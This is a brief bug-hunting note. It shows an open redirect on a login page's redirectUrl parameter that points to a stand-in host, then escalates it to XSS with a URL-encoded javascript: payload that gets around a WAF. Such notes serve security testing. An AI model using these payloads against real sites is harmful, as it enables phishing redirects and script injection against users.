# Bug_hunt_subject
```
Open Redirect

/login?redirectUrl=//evil,org --> redirect to evil,org

Escalate to XSS

/login?redirectUrl=javascript:alert(1) --> blocked by WAF
/login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain --> xss pop-up

```
